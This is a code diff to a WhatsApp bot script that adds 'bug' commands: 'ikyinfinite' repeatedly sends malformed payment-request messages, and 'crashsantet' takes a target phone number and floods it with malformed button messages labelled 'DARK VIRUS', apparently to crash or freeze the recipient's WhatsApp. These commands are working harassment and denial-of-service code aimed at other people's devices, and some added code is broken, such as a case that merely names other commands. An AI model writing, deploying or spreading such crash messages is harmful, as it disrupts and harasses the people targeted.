@@ -132,11 +132,11 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "isAnimated": false
 }}}
 //=================================================//
+const reply = (teks) => {
+return ikybotz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °iky°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })}
+
 const deploy = (teks) => {
   ikybotz.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
-//=================================================//
-const reply = (teks) => {
-return ikybotz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °iky°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -5479,6 +5479,62 @@ let res = await axioss({
 })
 diablobotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
 }
+break
+case 'masasih': {
+if (!isCreator) return
+deploy('- ɪᴋʏʏ ᴍᴀᴋᴇʀᴢ ᴄᴏᴍᴇʙᴀᴄᴋ -')
+}
+break
+case 'bug andalan': {
+masasih
+ikyinfinite
+}
+break
+case 'ikyinfinite': {
+if (!isCreator) return
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+deploy('𝐊𝐲𝐳𝐳𝐗 𝐁𝐨𝐭𝐳𝐳𝐗-') 
+await sleep (1200)
+}
+    break
+    case 'crashsantet':
+     if (!q) return 
+        num = `${q}`+'@s.whatsapp.net'
+        jumlah = '10'
+        waktu = `4s`
+for (let i = 0; i < jumlah; i++) {
+diablo.sendMessage(num, {
+text: 'BUG BY JOKER', 
+templateButtons: [
+{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
+{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
+{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
+{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
+{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
+{ quoted: deploy }
+]})}
+await sleep(ms(waktu))
 break
 //=================================================//
 /*
